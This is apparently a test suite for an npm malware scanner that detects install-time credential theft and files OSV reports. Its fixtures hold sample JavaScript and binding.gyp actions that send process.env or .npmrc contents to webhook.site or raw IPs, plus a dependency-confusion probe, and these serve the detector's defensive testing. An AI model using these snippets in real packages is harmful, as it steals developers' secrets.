import json
from datetime import datetime, timedelta, timezone

from gatekeeper.npm.tarball import PackageFiles
from gatekeeper.report import auto

NOW = datetime(2026, 10, 29, 12, 0, tzinfo=timezone.utc)

# inert text fixtures: patterns only, never executed
EXFIL_JS = "const h=require('https');\nconst d=JSON.stringify(process.env);\nh.request({hostname:'webhook.site',path:'/0000-test',method:'POST'}).end(d);\n"
GYP = json.dumps({"targets": [{"target_name": "x", "actions": [{"action_name": "run_postsetup", "inputs": [], "outputs": ["o"],
                  "action": ["node", "-e", "var h=require('https');var d=JSON.stringify(process.env);"
                             "h.request({hostname:'webhook.site',path:'/0000-test',method:'POST'}).end(d)"]}]}]})


def _pkg(files: dict[str, str]) -> PackageFiles:
    data = {k: v.encode() for k, v in files.items()}
    return PackageFiles(files=data, sizes={k: len(v) for k, v in data.items()})


def _manifest(**extra) -> str:
    return json.dumps({"name": "demo-pkg", "version": "1.0.0", **extra})


def _hook(cmd: str, code: str = EXFIL_JS, path: str = "setup.js"):
    return auto.install_evidence(_pkg({"package.json": _manifest(scripts={"postinstall": cmd}), path: code}), "1.0.0")


# ---- what must be reported

def test_postinstall_script_with_env_read_and_collection_request():
    ev = _hook("node setup.js")
    assert ev is not None and ev.file == "setup.js"
    assert "`postinstall` script is `node setup.js`" in ev.how_it_runs
    assert {f.kind for f in ev.facts} == {"destination", "read", "request"}
    assert ev.hosts == ["webhook.site"] and ev.urls == ["https://webhook.site/0000-test"]


def test_binding_gyp_build_action_with_default_node_gyp():
    ev = auto.install_evidence(_pkg({"package.json": _manifest(gypfile=True), "binding.gyp": GYP}), "1.0.0")
    assert ev is not None and ev.file == "binding.gyp"
    assert "node-gyp rebuild" in ev.how_it_runs and "run_postsetup" in ev.unit


def test_credential_file_read_to_raw_global_ip():
    code = "const fs=require('fs');\nconst k=fs.readFileSync(home+'/.npmrc','utf8');\nfetch('http://8.8.4.4:8080/c',{method:'POST',body:k});\n"
    ev = _hook("node setup.js", code)
    assert ev is not None and ev.hosts == ["8.8.4.4"]
    assert any(f.kind == "read" and f.note == ".npmrc" for f in ev.facts)


# ---- what must not be reported

def test_lookalike_hosts_do_not_count():
    for host in ("toast.me", "mywebhook.site", "webhook.site.example.com", "interact.shop"):
        code = EXFIL_JS.replace("webhook.site", host)
        assert _hook("node setup.js", code) is None, host


def test_commented_out_code_does_not_count():
    code = "const h=require('https');\n// const d=JSON.stringify(process.env);\n/* h.request({hostname:'webhook.site'}) */\n"
    assert _hook("node setup.js", code) is None


def test_script_must_run_the_file():
    for cmd in ("echo 'to configure run node setup.js'", "rm setup.js", "node-gyp rebuild || node setup.js", "node ../setup.js"):
        assert _hook(cmd) is None, cmd


def test_non_global_or_documentation_ips_do_not_count():
    for ip in ("203.0.113.9", "10.0.0.5", "127.0.0.1", "100.64.0.1", "999.1.1.1"):
        code = f"const d=JSON.stringify(process.env);\nfetch('http://{ip}/x',{{body:d}});\n"
        assert _hook("node setup.js", code) is None, ip


def test_keys_or_hostname_alone_are_not_a_read():
    for read in ("Object.keys(process.env)", "require('os').homedir()", "require('os').hostname()"):
        code = EXFIL_JS.replace("JSON.stringify(process.env)", read)
        assert _hook("node setup.js", code) is None, read


def test_no_request_call_no_report():
    assert _hook("node setup.js", "const d=JSON.stringify(process.env);\nconst u='https://webhook.site/x';\n") is None
    # a .get( call without a loaded network module is just a Map lookup
    assert _hook("node setup.js", "const d=JSON.stringify(process.env);\nm.get('https://webhook.site/x');\n") is None


def test_destination_far_from_read_does_not_count():
    code = "const d=JSON.stringify(process.env);\n" + "\n" * 60 + "fetch('https://webhook.site/x');\n"
    assert _hook("node setup.js", code) is None


def test_binding_gyp_not_built():
    off = _pkg({"package.json": _manifest(gypfile=False), "binding.gyp": GYP})
    own = _pkg({"package.json": _manifest(scripts={"install": "prebuild-install || node-gyp rebuild"}), "binding.gyp": GYP})
    assert auto.install_evidence(off, "1.0.0") is None
    assert auto.install_evidence(own, "1.0.0") is None


def test_binding_gyp_comment_or_define_does_not_count():
    gyp = "# fetch('https://webhook.site/x') JSON.stringify(process.env)\n" + json.dumps(
        {"targets": [{"target_name": "x", "defines": ["URL=https://webhook.site/x", "E=JSON.stringify(process.env) fetch("]}]})
    assert auto.install_evidence(_pkg({"package.json": _manifest(), "binding.gyp": gyp}), "1.0.0") is None


def test_discord_needs_the_webhook_path():
    code = "const d=JSON.stringify(process.env);\nfetch('https://discord.com/invite/abc',{body:d});\n"
    assert _hook("node setup.js", code) is None
    ev = _hook("node setup.js", code.replace("/invite/abc", "/api/webhooks/1/x"))
    assert ev is not None and ev.hosts == []  # discord.com itself is not an IoC domain
    assert ev.urls == ["https://discord.com/api/webhooks/1/x"]


# ---- model gate

def _v(verdict, conf=0.95, errors=()):
    return {"verdict": verdict, "confidence": conf, "errors": list(errors)}


def test_models_need_spark_and_spark_open():
    assert auto.models_agree({"spark": _v("malicious"), "spark-open-baseten": _v("malicious")})[0]
    # Llama Guard and unknown backends never stand in for a judge
    assert not auto.models_agree({"spark": _v("malicious"), "llamaguard-1b": _v("malicious", 1.0),
                                  "glimmer-local": _v("malicious"), "made-up": _v("malicious")})[0]


def test_any_dissent_low_confidence_or_bad_citation_blocks():
    base = {"spark": _v("malicious"), "spark-open-fireworks": _v("malicious")}
    assert not auto.models_agree(base | {"glimmer-local": _v("suspicious")})[0]
    assert not auto.models_agree(base | {"glimmer-local": _v("malicious", 0.85)})[0]
    assert not auto.models_agree(base | {"spark": _v("malicious", errors=["cites line 99"])})[0]


def test_spark_open_hosts_merge_to_the_weaker_answer():
    v = {"spark": _v("malicious"), "spark-open-fireworks": _v("malicious", 0.97), "spark-open-baseten": _v("malicious", 0.8)}
    ok, why = auto.models_agree(v)
    assert not ok and "spark-open confidence 0.8" in why


def test_package_must_be_new_and_unpopular():
    doc = {"name": "demo-pkg", "time": {"created": (NOW - timedelta(days=1)).isoformat()}, "versions": {"1.0.0": {}}}
    assert auto.package_is_new(doc, set(), NOW)[0]
    assert not auto.package_is_new(doc, {"demo-pkg"}, NOW)[0]
    assert not auto.package_is_new(dict(doc, time={"created": (NOW - timedelta(days=30)).isoformat()}), set(), NOW)[0]


# ---- report text

def test_report_quotes_code_and_cannot_be_injected():
    code = "const h=require('https');\nconst d=JSON.stringify(process.env);\nh.request({hostname:'webhook.site',path:'/x`[a](https://e.example)'}).end(d);\n"
    ev = _hook("node setup.js", code)
    osv = auto.build_osv("demo-pkg", [ev], {"1.0.0": "2026-10-29T11:58:00Z"}, "spark, spark-open", NOW)
    assert "id" not in osv and "summary" not in osv
    assert ev.sha256 in osv["details"] and "`JSON.stringify(process.env)`" in osv["details"]
    assert "published 2026-10-29 11:58 UTC" in osv["details"]
    assert osv["details"].count("`") % 2 == 0  # every code span is closed; quoted backticks were replaced
    assert osv["database_specific"]["iocs"]["domains"] == ["webhook.site"]


def test_names():
    assert auto.report_path("@scope/demo-pkg") == "osv/malicious/npm/@scope/demo-pkg/MAL-0000-gatekeeper-scope-demo-pkg.json"
    assert auto.branch_name("@scope/demo-pkg") == "gatekeeper-scope-demo-pkg"


PROBE = b"""const os = require('os'), https = require('https');
const body = JSON.stringify({ host: os.hostname(), home: os.homedir(), platform: process.platform });
const req = https.request('https://203.0.114.9:8443/', { method: 'POST' });
req.write(body); req.end();
"""


def _probe_pkg(code: bytes) -> PackageFiles:
    manifest = b'{"name":"p","version":"1.0.0","scripts":{"postinstall":"node ./index.cjs"}}'
    files = {"package.json": manifest, "index.cjs": code}
    return PackageFiles(files=files, sizes={p: len(b) for p, b in files.items()})


def test_dependency_confusion_probe_is_proven_statically():
    ev = auto.install_evidence(_probe_pkg(PROBE), "1.0.0")
    assert ev is not None and ev.hosts == ["203.0.114.9"]
    assert any(f.note == "host" for f in ev.facts)
    assert "the machine's identity" in auto.build_osv("p", [ev], {}, "Muse Spark", datetime(2026, 10, 30, tzinfo=timezone.utc))["details"]


def test_one_identity_call_is_not_a_probe():
    assert auto.install_evidence(_probe_pkg(PROBE.replace(b"home: os.homedir(), ", b"")), "1.0.0") is None


def test_identity_sent_to_an_ordinary_domain_is_not_a_probe():
    assert auto.install_evidence(_probe_pkg(PROBE.replace(b"203.0.114.9:8443", b"telemetry.example.com")), "1.0.0") is None


class _Resp:
    def __init__(self, payload):
        self.payload = payload

    def raise_for_status(self):
        pass

    def json(self):
        return self.payload


class _Github:
    def __init__(self, open_prs):
        self.open_prs, self.pr = open_prs, None

    def get(self, url, params=None):
        return _Resp({"total_count": self.open_prs} if "search" in url else {"object": {"sha": "abc"}})

    def put(self, url, json=None):
        return _Resp({})

    def post(self, url, json=None):
        if url.endswith("/pulls"):
            self.pr = json
        return _Resp({"html_url": "https://github.com/x/y/pull/1"})


def test_report_opens_as_draft_once_the_open_pull_request_limit_is_reached():
    full, free = _Github(3), _Github(2)
    auto.submit(full, {"id": "x"}, "pkg")
    auto.submit(free, {"id": "x"}, "pkg")
    assert full.pr["draft"] is True and free.pr["draft"] is False
